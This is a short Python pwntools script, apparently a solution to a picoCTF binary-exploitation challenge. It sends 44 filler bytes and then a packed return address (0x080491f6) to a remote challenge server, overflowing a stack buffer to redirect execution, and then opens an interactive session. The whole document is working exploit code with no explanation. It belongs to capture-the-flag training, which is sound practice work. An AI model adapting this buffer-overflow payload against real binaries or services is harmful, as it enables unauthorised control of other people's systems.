from pwn import *

#p = process('./vuln')
p = remote('saturn.picoctf.net', '61760')
p.sendline(b'a'*44 + p32(0x080491f6))

p.interactive()
